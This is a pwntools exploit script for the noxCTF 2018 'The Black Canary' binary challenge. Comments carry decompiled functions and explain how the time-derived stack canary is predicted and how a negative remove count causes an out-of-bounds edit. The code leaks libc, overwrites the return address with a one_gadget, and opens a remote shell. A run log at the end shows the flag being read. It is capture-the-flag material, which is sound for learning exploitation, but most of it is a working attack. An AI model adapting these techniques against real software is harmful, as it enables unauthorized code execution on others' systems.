#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./TheBlackCanary"
libcPath = "./libc.so.6"
remoteAddr = "chal.noxale.com"
remotePort = 6667

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG():
    info("PID -> {}".format(io.pid))
    raw_input("DEBUG: ")

def show():
    io.sendlineafter("die\n", "1")
    
def add(argument):
    assert len(argument) < 32
    io.sendlineafter("die\n", "2")
    io.sendafter(": \n", argument)

def edit(idx, argument):
    assert len(argument) < 32
    io.sendlineafter("die\n", "3")
    io.sendlineafter("?\n", str(idx))
    io.sendlineafter(": \n", argument)

def remove_single(idx):
    io.sendlineafter("die\n", "4")
    io.sendlineafter("arguments\n", "1")
    io.sendlineafter("remove?\n", str(idx))

def remove_consecutive(idx_start, num):
    io.sendlineafter("die\n", "4")
    io.sendlineafter("arguments\n", "2")
    io.sendlineafter("start?\n", str(idx_start))
    io.sendlineafter("remove?\n", str(num))

def leave():
    io.sendlineafter("die\n", "5")

get_canary = lambda : int(os.popen("./set_canary").read().strip(), 16)

if __name__ == "__main__":
    '''
    This challenge named "The Black Canary" suggests there must be something interesting with canary.
    And when I take a look at .init_array, an interesting function appears(I call it set_canary, located at 0x4008C7).
    unsigned __int64 set_canary()
{
  int v0; // ebx
  unsigned __int64 v1; // rbx
  int v2; // er12
  unsigned __int64 v3; // ST08_8
  time_t v4; // rbx
  unsigned __int64 v5; // ST08_8
  time_t v6; // ST08_8
  time_t v7; // ST08_8
  unsigned __int64 result; // rax

  time(0LL);
  time(0LL);
  v0 = time(0LL) >> 24;
  v1 = (unsigned __int64)(unsigned __int8)(v0 ^ (unsigned __int64)getenv(name)) << 24;
  v2 = time(0LL) >> 16;
  v3 = v1 + ((unsigned __int64)(unsigned __int8)(v2 ^ (unsigned __int64)getenv(name)) << 16);
  v4 = time(0LL) >> 8;
  v5 = (unsigned __int16)((((unsigned __int16)v4 ^ (unsigned __int16)time(0LL)) << 8) & 0xFF00) + v3;
  v6 = ((time(0LL) << 32) & 0xFF00000000LL) + v5;
  v7 = time(0LL) + v6;
  LODWORD(v4) = time(0LL) >> 24;
  LODWORD(v4) = (time(0LL) >> 16) + v4;
  LODWORD(v4) = (time(0LL) >> 8) + v4;
  result = ((unsigned __int64)(unsigned __int8)(v4 + time(0LL)) << 40) + v7;
  __writefsqword(0x28u, result);
  return result;
}
    And we know that time(0) is predictable, as a result, we're able to predict canary. So if there is a stack_overflow_bug, this challenge will be easy to be pwned.
    '''
    canary = get_canary()
    success("canary", canary)

    '''
    The bof bug will appear it we use remove_consecutive() with a negative amount of arguments.
    void __fastcall remove_consecutive(char *arg_list, _DWORD *cnt)
{
  size_t len; // rax
  char idx; // [rsp+15h] [rbp-Bh]
  char remove_num; // [rsp+16h] [rbp-Ah]
  char i; // [rsp+17h] [rbp-9h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  idx = 0;
  remove_num = 0;
  i = 0;
  print("With which argument would you like to start?");
  fflush(stdin);
  __isoc99_scanf("%hhd", &idx);
  getchar();
  if ( idx < 0 || (char)*cnt <= idx )
  {
    print("Index not in range");
  }
  else
  {
    print("How many arguments would you like to remove?");
    fflush(stdin);
    __isoc99_scanf("%hhd", &remove_num);        // negative
    getchar();
    if ( remove_num + idx < (char)*cnt )
    {
      for ( i = 0; i < remove_num; ++i )
      {
        if ( remove_num + i + idx >= (char)*cnt )
        {
          arg_list[32 * (idx + i)] = 0;
        }
        else
        {
          len = strlen(&arg_list[32 * (i + idx + remove_num)]);
          strncpy(&arg_list[32 * (idx + i)], &arg_list[32 * (i + idx + remove_num)], len + 1);
          arg_list[32 * (i + idx + remove_num)] = 0;
        }
      }
      *cnt -= remove_num;                       // bug here
    }
  }
}
    A negative number will lead to cnt be greater than 10, which to say, we can print the content behand arg_list[328] on the stack then we can leak libc. 
    Most importantly, we can use edit(10, payload) to modify retaddr to one_gadget.
    Then we're able to get a shell.
    '''
    for i in xrange(10):
        add(str(i) * 31)
    remove_consecutive(9, '-6')
    show()
    io.recvuntil("\x7f")
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 0x5f1168
    success("libc", libc.address)

    #  DEBUG()
    one_gadget = libc.address + 0x45216
    edit(10, 'aaaaaaaa' + p64(canary) + 'bbbbbbbb' + p64(one_gadget)[:-1])
    leave()

    io.interactive()

    '''
    noxCTF2018_The_Black_Canary [master●●] python exp.py r
    [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/TheBlackCanary'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [+] Opening connection to chal.noxale.com on port 6667: Done
    [*] '/home/m4x/pwn_repo/noxCTF2018_The_Black_Canary/libc.so.6'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] canary -> 0xaa1fb7311f1f
    [+] libc -> 0x7fbfa7624000
    [*] Switching to interactive mode
    You could have saved them all
    $ cat flag
    noxCTF{Mas7er_0f_ROPcha1ns}
    $
    [*] Closed connection to chal.noxale.com port 6667
    '''
